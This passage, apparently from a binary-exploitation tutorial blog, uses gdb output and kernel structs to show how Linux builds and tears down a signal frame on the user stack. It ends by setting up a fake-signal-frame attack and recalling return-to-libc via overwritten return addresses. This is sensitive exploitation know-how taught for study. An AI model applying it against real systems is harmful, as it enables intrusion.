  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm14          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
ymm15          {
  v8_float = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_double = {0x0, 0x0, 0x0, 0x0}, 
  v32_int8 = {0x0 <repeats 32 times>}, 
  v16_int16 = {0x0 <repeats 16 times>}, 
  v8_int32 = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
  v4_int64 = {0x0, 0x0, 0x0, 0x0}, 
  v2_int128 = {0x0, 0x0}
}
```

Before continuing, let us break at the first instruction of ```sigint_handler```. Generally in gdb, the prologue of the function is executed and then execution stops if you have set a breakpoint at a function.

```
gdb-peda$ disass sigint_handler
Dump of assembler code for function sigint_handler:
   0x000055555555468a <+0>:	push   rbp
   0x000055555555468b <+1>:	mov    rbp,rsp
   0x000055555555468e <+4>:	sub    rsp,0x10
   0x0000555555554692 <+8>:	mov    DWORD PTR [rbp-0x4],edi
=> 0x0000555555554695 <+11>:	lea    rdi,[rip+0xb8]        # 0x555555554754
   0x000055555555469c <+18>:	call   0x555555554550 <puts@plt>
   0x00005555555546a1 <+23>:	nop
   0x00005555555546a2 <+24>:	leave  
   0x00005555555546a3 <+25>:	ret    
End of assembler dump.
gdb-peda$ b *0x000055555555468a
Breakpoint 3 at 0x55555555468a: file code2.c, line 5.
```

Let us continue.

```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7af2224 (<__GI___libc_write+20>:	cmp    rax,0xfffffffffffff000)
RDX: 0x7fffffffd2c0 --> 0x7 
RSI: 0x7fffffffd3f0 --> 0x0 
RDI: 0x2 
RBP: 0x7fffffffd860 --> 0x5555555546d0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffd2b8 --> 0x7ffff7a21040 (<__restore_rt>:	mov    rax,0xf)
RIP: 0x55555555468a (<sigint_handler>:	push   rbp)
R8 : 0x0 
R9 : 0x0 
R10: 0x555555756010 --> 0x0 
R11: 0x246 
R12: 0x555555554580 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffd940 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555554681 <frame_dummy+1>:	mov    rbp,rsp
   0x555555554684 <frame_dummy+4>:	pop    rbp
   0x555555554685 <frame_dummy+5>:	jmp    0x5555555545f0 <register_tm_clones>
=> 0x55555555468a <sigint_handler>:	push   rbp
   0x55555555468b <sigint_handler+1>:	mov    rbp,rsp
   0x55555555468e <sigint_handler+4>:	sub    rsp,0x10
   0x555555554692 <sigint_handler+8>:	mov    DWORD PTR [rbp-0x4],edi
   0x555555554695 <sigint_handler+11>:	lea    rdi,[rip+0xb8]        # 0x555555554754
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd2b8 --> 0x7ffff7a21040 (<__restore_rt>:	mov    rax,0xf)
0008| 0x7fffffffd2c0 --> 0x7 
0016| 0x7fffffffd2c8 --> 0x0 
0024| 0x7fffffffd2d0 --> 0x0 
0032| 0x7fffffffd2d8 --> 0xffff00000000 
0040| 0x7fffffffd2e0 --> 0x0 
0048| 0x7fffffffd2e8 --> 0x0 
0056| 0x7fffffffd2f0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 3, sigint_handler (x=0x2) at code2.c:5
5	{
```

Let us first take a look at the backtrace.

```
gdb-peda$ bt
#0  sigint_handler (x=0x7fff) at code2.c:5
#1  <signal handler called>
#2  main () at code2.c:14
#3  0x00007ffff7a03bf7 in __libc_start_main (main=0x5555555546a4 <main>, argc=0x1, argv=0x7fffffffd948, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffd938) at ../csu/libc-start.c:310
#4  0x00005555555545aa in _start ()
```

In #1, it simply tells that the signal handler is called and control is transfered to ```sigint_handler```. We are here at our ```sigint_handler``` running in the signal-context. The above is the snapshot right before the sigint_handler is run. Notice if there are any changes in the registers, in the stack.

One significant difference between process-context snapshot and signal-context snapshot is the **Stack-Pointer**. In the process-context, rsp = 0x7fffffffd860. In the signal-context(just before running the handler), rsp = 0x7fffffffd2b8. That is a difference of 1448 bytes. If the signal-handler is called like any other normal function, the Stack-Pointer would have remained the same (when we observe just before the function is executed). But that is not the case here. Significant amount of memory is allocated in stack for something and then control is handed over to the signal-handler.

What is stored in those 1448 bytes of stack?

# 2.2 Storing Process-Context details in Stack

Let us dump it.

```
gdb-peda$ x/181qx $rsp
0x7fffffffd2b8:	0x00007ffff7a21040	0x0000000000000007
0x7fffffffd2c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd2d8:	0x0000ffff00000000	0x0000000000000000
0x7fffffffd2e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd2f8:	0x0000555555756010	0x0000000000000246
0x7fffffffd308:	0x0000555555554580	0x00007fffffffd940
0x7fffffffd318:	0x0000000000000000	0x0000000000000000
0x7fffffffd328:	0x0000000000000001	0x0000555555756260
0x7fffffffd338:	0x00007fffffffd860	0x0000000000000000
0x7fffffffd348:	0x00007ffff7dcf8c0	0x0000000000000018
0x7fffffffd358:	0x00007ffff7af2224	0x00007fffffffd860
0x7fffffffd368:	0x00005555555546c5	0x0000000000000202
0x7fffffffd378:	0x002b000000000033	0x0000000000000000
0x7fffffffd388:	0x0000000000000001	0x0000000000000000
0x7fffffffd398:	0x0000000000000000	0x00007fffffffd480
0x7fffffffd3a8:	0x000000000000000e	0x0000000000000000
0x7fffffffd3b8:	0x0000000000000000	0xffffffffffffffff
0x7fffffffd3c8:	0xffffffffffffffff	0x0000000400000004
0x7fffffffd3d8:	0x0000000400000004	0x00007ffff7dce420
0x7fffffffd3e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd3f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd408:	0x0000000000000000	0x0000000000000000
0x7fffffffd418:	0x0000000000000000	0x0000000000000000
0x7fffffffd428:	0x0000000000000000	0x0000000000000000
0x7fffffffd438:	0x0000000000000000	0x0000000000000000
0x7fffffffd448:	0x0000000000000000	0x0000000000000000
0x7fffffffd458:	0x0000000000000000	0x00007ffff7ffe4c8
0x7fffffffd468:	0x0000000000000000	0x00007fffffffd630
0x7fffffffd478:	0x00007ffff7a02fb0	0x000000000000037f
0x7fffffffd488:	0x0000000000000000	0x0000000000000000
0x7fffffffd498:	0x0000ffff00001f80	0x0000000000000000
0x7fffffffd4a8:	0x0000000000000000	0x0000000000000000
0x7fffffffd4b8:	0x0000000000000000	0x0000000000000000
0x7fffffffd4c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd4d8:	0x0000000000000000	0x0000000000000000
0x7fffffffd4e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd4f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd508:	0x0000000000000000	0x0000000000000000
0x7fffffffd518:	0x0000000000000000	0x00007ffff7dce480
0x7fffffffd528:	0x00007ffff7dce480	0x00007ffff7dce440
0x7fffffffd538:	0x00007ffff7dce440	0x0000007e0000007d
0x7fffffffd548:	0x000000800000007f	0x00007ffff7dcdc30
0x7fffffffd558:	0x00007ffff7dcdc30	0x000000000000000e
0x7fffffffd568:	0x000000000000000e	0x0000000000000000
0x7fffffffd578:	0x0000000000000000	0xffffffffffffffff
0x7fffffffd588:	0xffffffffffffffff	0x0000000400000004
0x7fffffffd598:	0x0000000400000004	0x00007ffff7dce420
0x7fffffffd5a8:	0x00007ffff7dce420	0x0000000000000000
0x7fffffffd5b8:	0x0000000000000000	0x0000000000000000
0x7fffffffd5c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd5d8:	0x0000000000000000	0x0000000000000000
0x7fffffffd5e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd5f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd608:	0x0000000000000000	0x0000000000000000
0x7fffffffd618:	0x0000000000000000	0x0000000000000430
0x7fffffffd628:	0xffffffffffffffb0	0x0000000000000010
0x7fffffffd638:	0x0000004000000041	0x0000000000000002
0x7fffffffd648:	0x0000000000000000	0x0000034446505853
0x7fffffffd658:	0x0000000000000007	0x0000000000000340
0x7fffffffd668:	0x0000000000000000	0x0000000000000000
0x7fffffffd678:	0x0000000000000000	0x0000000000000003
0x7fffffffd688:	0x0000000000000000	0x0000000000000000
0x7fffffffd698:	0x0000000000000000	0x0000000000000000
0x7fffffffd6a8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6b8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6d8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd708:	0x0000000000000000	0x0000000000000000
0x7fffffffd718:	0x0000000000000000	0x0000000000000000
0x7fffffffd728:	0x0000000000000000	0x0000000000000000
0x7fffffffd738:	0x0000000000000000	0x0000000000000000
0x7fffffffd748:	0x0000000000000000	0x0000000000000000
0x7fffffffd758:	0x0000000000000000	0x0000000000000000
0x7fffffffd768:	0x0000000000000000	0x0000000000000000
0x7fffffffd778:	0x0000000000000000	0x0000000000000000
0x7fffffffd788:	0x0000000000000000	0x0000000000000000
0x7fffffffd798:	0x0000000000000000	0x0000000000000000
0x7fffffffd7a8:	0x0000000000000000	0x0000000000000000
0x7fffffffd7b8:	0x0000000000000000	0x0000555546505845
0x7fffffffd7c8:	0x00007ffff7a6f021	0x0000000000000017
0x7fffffffd7d8:	0x00007ffff7dce760	0x000000000000000a
0x7fffffffd7e8:	0x000055555555476c	0x00007ffff7dca2a0
0x7fffffffd7f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd808:	0x00007ffff7a6f4d3	0x0000000000000017
0x7fffffffd818:	0x00007ffff7dce760	0x000055555555476c
0x7fffffffd828:	0x00007ffff7a62c42	0x00007ffff7ffe738
0x7fffffffd838:	0x0000000000000000	0x00007fffffffd860
0x7fffffffd848:	0x0000555555554580	0x00007fffffffd940
0x7fffffffd858:	0x00005555555546c5
gdb-peda$ 
```

Now, there is a small exercise: Compare the stack-dump you have generated with the Process-context register-values we dumped. See if you can find something there.

The following is very apparent.

```
gdb-peda$ x/181qx 0x7fffffffd2b8
0x7fffffffd2b8:	0x00007ffff7a21040	0x0000000000000007
0x7fffffffd2c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd2d8:	0x0000ffff00000000  0x0000000000000000
0x7fffffffd2e8:	--------R8--------	--------R9--------
0x7fffffffd2f8:	--------R10-------	--------R11-------
0x7fffffffd308:	--------R12-------	--------R13-------
0x7fffffffd318:	--------R14-------	--------R15-------
0x7fffffffd328:	--------RDI-------  --------RSI-------
0x7fffffffd338:	--------RBP-------	--------RBX-------
0x7fffffffd348:	--------RDX-------	--------RAX-------
0x7fffffffd358:	--------RCX-------	--------RSP-------
0x7fffffffd368: --------RIP-------	------EFLAGS------
0x7fffffffd378: --SS--FS--GS--CS--	0x0000000000000000
0x7fffffffd388:	0x0000000000000001  0x0000000000000000
0x7fffffffd398:	0x0000000000000000	0x00007fffffffd480
0x7fffffffd3a8:	0x000000000000000e	0x0000000000000000
0x7fffffffd3b8:	0x0000000000000000	0xffffffffffffffff
0x7fffffffd3c8:	0xffffffffffffffff	0x0000000400000004
0x7fffffffd3d8:	0x0000000400000004	0x00007ffff7dce420
0x7fffffffd3e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd3f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd408:	0x0000000000000000	0x0000000000000000
0x7fffffffd418:	0x0000000000000000	0x0000000000000000
0x7fffffffd428:	0x0000000000000000	0x0000000000000000
0x7fffffffd438:	0x0000000000000000	0x0000000000000000
0x7fffffffd448:	0x0000000000000000	0x0000000000000000
0x7fffffffd458:	0x0000000000000000	0x00007ffff7ffe4c8
0x7fffffffd468:	0x0000000000000000	0x00007fffffffd630
0x7fffffffd478:	0x00007ffff7a02fb0  0x000000000000037f
0x7fffffffd488:	0x0000000000000000	0x0000000000000000
0x7fffffffd498:	m_mask---|---mxcsr	------st0-0-------
0x7fffffffd4a8:	------st0-1-------	------st1-0-------
0x7fffffffd4b8:	------st1-1-------	------st2-0-------
0x7fffffffd4c8:	------st2-1-------	------st3-0-------
0x7fffffffd4d8:	------st3-1-------	------st4-0-------
0x7fffffffd4e8:	------st4-1-------	------st5-0-------
0x7fffffffd4f8:	------st5-1-------	------st6-0-------
0x7fffffffd508:	------st6-1-------	------st7-0-------
0x7fffffffd518:	------st7-1-------	---ymm0-int64-0---
0x7fffffffd528:	---ymm0-int64-1---	---ymm1-int64-0---
0x7fffffffd538:	---ymm1-int64-1---	---ymm2-int64-0---
0x7fffffffd548:	---ymm2-int64-1---	---ymm3-int64-0---
0x7fffffffd558:	---ymm3-int64-1---	---ymm4-int64-0---
0x7fffffffd568:	---ymm4-int64-1---  ---ymm5-int64-0---
0x7fffffffd578:	---ymm5-int64-1---  ---ymm6-int64-0---
0x7fffffffd588:	---ymm6-int64-1---	---ymm7-int64-0---
0x7fffffffd598:	---ymm7-int64-1---	---ymm8-int64-0---
0x7fffffffd5a8:	---ymm8-int64-1---	---ymm9-int64-0---
0x7fffffffd5b8:	---ymm9-int64-1---  --ymm10-int64-0---
0x7fffffffd5c8:	--ymm10-int64-1---	--ymm11-int64-0---
0x7fffffffd5d8:	--ymm11-int64-1---	--ymm12-int64-0---
0x7fffffffd5e8:	--ymm12-int64-1---	--ymm13-int64-0---
0x7fffffffd5f8:	--ymm13-int64-1---	--ymm14-int64-0---
0x7fffffffd608:	--ymm14-int64-1---	--ymm15-int64-0---
0x7fffffffd618:	--ymm15-int64-1---	0x0000000000000430
0x7fffffffd628:	0xffffffffffffffb0	0x0000000000000010
0x7fffffffd638:	0x0000004000000041	0x0000000000000002
0x7fffffffd648:	0x0000000000000000	0x0000034446505853
0x7fffffffd658:	0x0000000000000007	0x0000000000000340
0x7fffffffd668:	0x0000000000000000	0x0000000000000000
0x7fffffffd678:	0x0000000000000000	0x0000000000000003
0x7fffffffd688:	0x0000000000000000	0x0000000000000000
0x7fffffffd698:	0x0000000000000000	0x0000000000000000
0x7fffffffd6a8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6b8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6d8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6e8:	0x0000000000000000	0x0000000000000000
0x7fffffffd6f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd708:	0x0000000000000000	0x0000000000000000
0x7fffffffd718:	0x0000000000000000	0x0000000000000000
0x7fffffffd728:	0x0000000000000000	0x0000000000000000
0x7fffffffd738:	0x0000000000000000	0x0000000000000000
0x7fffffffd748:	0x0000000000000000	0x0000000000000000
0x7fffffffd758:	0x0000000000000000	0x0000000000000000
0x7fffffffd768:	0x0000000000000000	0x0000000000000000
0x7fffffffd778:	0x0000000000000000	0x0000000000000000
0x7fffffffd788:	0x0000000000000000	0x0000000000000000
0x7fffffffd798:	0x0000000000000000	0x0000000000000000
0x7fffffffd7a8:	0x0000000000000000	0x0000000000000000
0x7fffffffd7b8:	0x0000000000000000	0x0000555546505845
0x7fffffffd7c8:	0x00007ffff7a6f021	0x000000000000001b
0x7fffffffd7d8:	0x00007ffff7dce760	0x000000000000000a
0x7fffffffd7e8:	0x000055555555476c	0x00007ffff7dca2a0
0x7fffffffd7f8:	0x0000000000000000	0x0000000000000000
0x7fffffffd808:	0x00007ffff7a6f4d3	0x000000000000001b
0x7fffffffd818:	0x00007ffff7dce760	0x000055555555476c
0x7fffffffd828:	0x00007ffff7a62c42	0x00007ffff7ffe738
0x7fffffffd838:	0x0000000000000000	0x00007fffffffd860
0x7fffffffd848:	0x0000555555554580	0x00007fffffffd940
0x7fffffffd858:	0x00005555555546c5
```

The general purpose registers values, floating-point registers' values of the Process-context is stored here. There is a lot more than just registers.

What happens is the following: When a signal is sent, the kernel takes over, takes a snapshot of the Process-context and stores it in the **user-stack** itself. Once that is done, kernel transfers control to the registered signal handler.

# 2.3 Exploring RunTime Signal Frame

This snapshot is officially known as a **signal frame** OR **sigframe**. It is defined in [arch/x86/include/asm/sigframe.h](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/sigframe.h) in the Linux kernel source. I am currently experimenting on a x86_64 Linux box. So the following is the [structure](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/sigframe.h#L59).

```c
struct rt_sigframe {
	char __user *pretcode;
	struct ucontext uc;
	struct siginfo info;
	/* fp state follows here */
};
```

**rt** stands for runtime. So this is a **RunTime Signal Frame**. One instance of this structure is put on the user-stack by the kernel and control is transferred to the signal handler. Let us explore the one instance we have.

### 2.3.1 What is __restore_rt?

Let us start with the first member of the structure: ```char __user *pretcode```. It is a pointer - this means the first 8 bytes in the stack should be this member. Referring back to the stack-dump,

```
gdb-peda$ x/181qx 0x7fffffffd2b8
0x7fffffffd2b8:	0x00007ffff7a21040	0x0000000000000007
```

Let us checkout what is present at 0x00007ffff7a21040. Note that it is an address in userspace (**__user**).

```
gdb-peda$ x/5i 0x00007ffff7a21040
   0x7ffff7a21040 <__restore_rt>:	mov    rax,0xf
   0x7ffff7a21047 <__restore_rt+7>:	syscall
```

It is a function called ```__restore_rt```. It is executing a system call. It is the ```rt_sigreturn``` system call. Let us take a look at its manpage.

```
SIGRETURN(2)                                                         Linux Programmer's Manual                                                         SIGRETURN(2)

NAME
       sigreturn, rt_sigreturn - return from signal handler and cleanup stack frame

SYNOPSIS
       int sigreturn(...);

DESCRIPTION
       If the Linux kernel determines that an unblocked signal is pending for a process, then, at the next transition back to user mode in that process (e.g., upon
       return from a system call or when the process is rescheduled onto the CPU), it creates a new frame on the user-space stack where it saves various pieces  of
       process context (processor status word, registers, signal mask, and signal stack settings).

       The kernel also arranges that, during the transition back to user mode, the signal handler is called, and that, upon return from the handler, control passes
       to a piece of user-space code commonly called the "signal trampoline".  The signal trampoline code in turn calls sigreturn().

       This sigreturn() call undoes everything that was done—changing the process's signal mask, switching signal stacks (see sigaltstack(2))—in  order  to  invoke
       the  signal  handler.  Using the information that was earlier saved on the user-space stack sigreturn() restores the process's signal mask, switches stacks,
       and restores the process's context (processor flags and registers, including the stack pointer and instruction pointer), so that the process resumes  execu‐
       tion at the point where it was interrupted by the signal.
```

This manpage explains the whole process in a nice and concise manner.

The ```__restore_rt``` is nothing but the **signal-trampoline** code which calls the ```rt_sigreturn``` system call. It **undoes** everything was done by the kernel in order to create a Signal-context and execute the signal handler.


Look at how the stack is arranged for the ```sigint_handler```.

```
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd2b8 --> 0x7ffff7a21040 (<__restore_rt>:	mov    rax,0xf)
0008| 0x7fffffffd2c0 --> 0x7 
0016| 0x7fffffffd2c8 --> 0x0 
0024| 0x7fffffffd2d0 --> 0x0 
0032| 0x7fffffffd2d8 --> 0xffff00000000 
0040| 0x7fffffffd2e0 --> 0x0 
0048| 0x7fffffffd2e8 --> 0x0 
0056| 0x7fffffffd2f0 --> 0x0
```

It is present in such a way that ```__restore_rt``` is the signal-handler's return-address. Once the signal handler is done running, ```__restore_rt``` is called. This function literally does what it's name suggests. It restores the original runtime of the Process. It cleans up the stack (the 1448 bytes), loads the registers' values and other details and the Process-context is resumed/restored. Go ahead and run it.

```
[-------------------------------------code-------------------------------------]
   0x55555555469c <sigint_handler+18>:	call   0x555555554550 <puts@plt>
   0x5555555546a1 <sigint_handler+23>:	nop
   0x5555555546a2 <sigint_handler+24>:	leave  
=> 0x5555555546a3 <sigint_handler+25>:	ret    
   0x5555555546a4 <main>:	push   rbp
   0x5555555546a5 <main+1>:	mov    rbp,rsp
   0x5555555546a8 <main+4>:	lea    rsi,[rip+0xffffffffffffffdb]        # 0x55555555468a <sigint_handler>
   0x5555555546af <main+11>:	mov    edi,0x2
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd2b8 --> 0x7ffff7a21040 (<__restore_rt>:	mov    rax,0xf)
0008| 0x7fffffffd2c0 --> 0x7 
0016| 0x7fffffffd2c8 --> 0x0 
0024| 0x7fffffffd2d0 --> 0x0 
0032| 0x7fffffffd2d8 --> 0xffff00000000 
0040| 0x7fffffffd2e0 --> 0x0 
0048| 0x7fffffffd2e8 --> 0x0 
0056| 0x7fffffffd2f0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00005555555546a3	7	}
```

Let us step into the ```__restore_rt``` function.

```
[-------------------------------------code-------------------------------------]
   0x7ffff7a21030:	nop
   0x7ffff7a21031:	nop    DWORD PTR [rax+rax*1+0x0]
   0x7ffff7a21036:	nop    WORD PTR cs:[rax+rax*1+0x0]
=> 0x7ffff7a21040 <__restore_rt>:	mov    rax,0xf
   0x7ffff7a21047 <__restore_rt+7>:	syscall 
   0x7ffff7a21049 <__restore_rt+9>:	nop    DWORD PTR [rax+0x0]
   0x7ffff7a21050 <__GI___libc_sigaction>:	sub    rsp,0x148
   0x7ffff7a21057 <__GI___libc_sigaction+7>:	mov    r8,rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd2c0 --> 0x7 
0008| 0x7fffffffd2c8 --> 0x0 
0016| 0x7fffffffd2d0 --> 0x0 
0024| 0x7fffffffd2d8 --> 0xffff00000000 
0032| 0x7fffffffd2e0 --> 0x0 
0040| 0x7fffffffd2e8 --> 0x0 
0048| 0x7fffffffd2f0 --> 0x0 
0056| 0x7fffffffd2f8 --> 0x555555756010 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
<signal handler called>
```

Let us run the ```syscall``` instruction and see what happens. You should see that the Process-context is restored and you are back in ```main``` function executing the infinite loop.

Now, we have seen how the kernel sets up the user-space to enter the Signal-context and how it cleans up everything to restore the Process-context.

### 2.3.2 User-context

Next member in the ```struct rt_sigframe``` is ```struct ucontext uc```. It is defined in [/include/uapi/asm-generic/ucontext.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/asm-generic/ucontext.h#L5).

```c
struct ucontext {
	unsigned long	  uc_flags;
	struct ucontext  *uc_link;
	stack_t		  uc_stack;
	struct sigcontext uc_mcontext;
	sigset_t	  uc_sigmask;	/* mask last for extensibility */
};
```

This structure is at the heart of the sigframe. The [struct sigcontext](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h#L325). It has **all** the general purpose registers and other metadata.

```c
struct sigcontext {
	__u64				r8;
	__u64				r9;
	__u64				r10;
	__u64				r11;
	__u64				r12;
	__u64				r13;
	__u64				r14;
	__u64				r15;
	__u64				rdi;
	__u64				rsi;
	__u64				rbp;
	__u64				rbx;
	__u64				rdx;
	__u64				rax;
	__u64				rcx;
	__u64				rsp;
	__u64				rip;
	__u64				eflags;		/* RFLAGS */
	__u16				cs;

	/*
	 * Prior to 2.5.64 ("[PATCH] x86-64 updates for 2.5.64-bk3"),
	 * Linux saved and restored fs and gs in these slots.  This
	 * was counterproductive, as fsbase and gsbase were never
	 * saved, so arch_prctl was presumably unreliable.
	 *
	 * These slots should never be reused without extreme caution:
	 *
	 *  - Some DOSEMU versions stash fs and gs in these slots manually,
	 *    thus overwriting anything the kernel expects to be preserved
	 *    in these slots.
	 *
	 *  - If these slots are ever needed for any other purpose,
	 *    there is some risk that very old 64-bit binaries could get
	 *    confused.  I doubt that many such binaries still work,
	 *    though, since the same patch in 2.5.64 also removed the
	 *    64-bit set_thread_area syscall, so it appears that there
	 *    is no TLS API beyond modify_ldt that works in both pre-
	 *    and post-2.5.64 kernels.
	 *
	 * If the kernel ever adds explicit fs, gs, fsbase, and gsbase
	 * save/restore, it will most likely need to be opt-in and use
	 * different context slots.
	 */
	__u16				gs;
	__u16				fs;
	union {
		__u16			ss;	/* If UC_SIGCONTEXT_SS */
		__u16			__pad0;	/* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
	};
	__u64				err;
	__u64				trapno;
	__u64				oldmask;
	__u64				cr2;
	struct _fpstate __user		*fpstate;	/* Zero when no FPU context */
#  ifdef __ILP32__
	__u32				__fpstate_pad;
#  endif
	__u64				reserved1[8];
};
```

The **fpstate** is the FPU Context which points to another location in the stack.

### 2.3.3 Conclusion

The following is the RunTime Signal Frame structure.

```c
struct rt_sigframe {
	char __user *pretcode;
	struct ucontext uc;
	struct siginfo info;
	/* fp state follows here */
};
```

We peeked at the first 2 fields. I will be ignoring the ```struct siginfo info``` field of the ```rt_sigframe``` structure.

The FPU-Context if present is present after the ```struct siginfo info``` field. In my stack-dump, you can actually see FPU-Context. First, let us point out the ```fpstate``` pointer present in ```sigcontext```.

```
gdb-peda$ x/181qx 0x7fffffffd2b8
0x7fffffffd2b8:	0x00007ffff7a21040	0x0000000000000007
0x7fffffffd2c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd2d8:	0x0000ffff00000000  0x0000000000000000
0x7fffffffd2e8:	--------R8--------	--------R9--------
0x7fffffffd2f8:	--------R10-------	--------R11-------
0x7fffffffd308:	--------R12-------	--------R13-------
0x7fffffffd318:	--------R14-------	--------R15-------
0x7fffffffd328:	--------RDI-------  --------RSI-------
0x7fffffffd338:	--------RBP-------	--------RBX-------
0x7fffffffd348:	--------RDX-------	--------RAX-------
0x7fffffffd358:	--------RCX-------	--------RSP-------
0x7fffffffd368: --------RIP-------	------EFLAGS------
0x7fffffffd378: --SS--FS--GS--CS--	0x0000000000000000
0x7fffffffd388:	0x0000000000000001  0x0000000000000000
0x7fffffffd398:	0x0000000000000000	0x00007fffffffd480
```

The 8 bytes present at the address 0x7fffffffd39a0 = **0x00007fffffffd480**, this is where the FPU-context is present. Let us take a look at it. The FPU-context is actually one more structure in itself. It is defined in [arch/x86/include/uapi/asm/sigcontext.h](https://elixir.bootlin.com/linux/latest/source/arch/x86/include/uapi/asm/sigcontext.h). I have mentioned the different registers and its values in Sub-section 2.2. In case no FPU-context is present, the ```fpstate``` will be 0(or NULL).

To sum it all up, the following is how a sigframe looks like.

```
--__restore_rt()--  -----uc_flags-----                          
------uc_link-----  --uc_stack.ss_sp--                          
uc_stack.ss_flags   -uc_stack.ss_size-                          
--------R8--------  --------R9--------                          
--------R10-------  --------R11-------                          
--------R12-------  --------R13-------                          
--------R14-------  --------R15-------                          
--------RDI-------  --------RSI-------                          
--------RBP-------  --------RBX-------                          
--------RDX-------  --------RAX-------                          
--------RCX-------  --------RSP-------                          
--------RIP-------  ------EFLAGS------                          
--SS--FS--GS--CS--  --------ERR-------                          
-------TRAP-NO----  -----OLD-MASK-----                          
-------CR2--------  ------fpstate-----                          
----__reserved----  ----uc_sigmask----
```

Then comes the ```struct siginfo``` and later the FPU-context IF it is present.

To summarize: When a signal is sent to a process and the process has a registered signal handler, the kernel will setup a Runtime Signal Frame in the user-stack. This Runtime Signal Frame contains all the details related to the Process-context. Once it is setup, the kernel transfers control to the signal handler. Once the signal handler is done executing, it returns. The Signal Frame is setup in such a way that the return-address of the signal handler is the ```__restore_rt``` function which calls the ```rt_sigreturn``` system call. This system call cleans up the Runtime Signal Frame, undoes everything the kernel had to do to transfer control to the signal handler. Once the cleanup is done, control is transferred back to Process-Context code - execution will start from where it had stopped.

The kernel not just cleans up the stack, it also loads back the Process-context details present in that Signal Frame and then transfers back the control to where the ```rip```(Instruction Pointer) was pointing.

## 3. What is the vulnerability?

The setting up and clean up of the Signal-context is fairly simple. The kernel sets up the whole thing. Once everything is done, the kernel cleans up the whole thing, loads back the Process-context and transfers control back - with small help from userspace: The ```__restore_rt``` function is invoked from userspace code.

The kernel can clean up without any hesitation. But before reloading the Process-context back to the processor, does the kernel have a method to check IF IT actually setup that Signal Frame? Is it really re-loading what it setup? Under wierd circumstances, **can we trick the kernel into cleaning up something IT DID NOT setup?** Implying that **Can we setup a fake Signal Frame and request the kernel to clean it up?** Let us explore these questions.

Note that if the kernel has a way to check the legitimacy of the Signal Frame, then there is no vulnerability. It can identify that it is dealing with a fake Signal Frame and can take necessary action(like killing the process). Assuming that the kernel doesn't check, we will proceed.

# 3.1 Can we setup a fake Signal Frame?

In Return-To-Libc exploit method([Part1](/reverse/engineering/and/binary/exploitation/series/2019/03/04/return-to-libc-part1.html), [Part2](/reverse/engineering/and/binary/exploitation/series/2019/03/06/return-to-libc-part2.html)), we had to actually setup fake stack frame for the exploit to work. Assume we have a buffer-overflow vulnerability in a function and we can overwrite its return-address with whatever we want. Suppose we want to execute the ```system("/bin/sh")``` function, we would overwrite the function's return-address with ```system```'s address. That way, when the ```ret``` instruction is executed, the control is transferred to the ```system``` function. BUT is this enough? Not really. We need to pass an argument as well. If we want to execute ```execve```, we have to setup 3 arguments. If we are dealing with x86_64 Linux box, we will have to load the arguments in registers. If it is a x86(32-bit) box, we need to setup a fake stack-frame with the arguments in it. And it continued.

Even if we setup a fake stack-frame OR setup registers using gadgets, ```system``` or any target function would run exactly how it would run in normal cases - when that function is invoked using a ```call``` instruction.

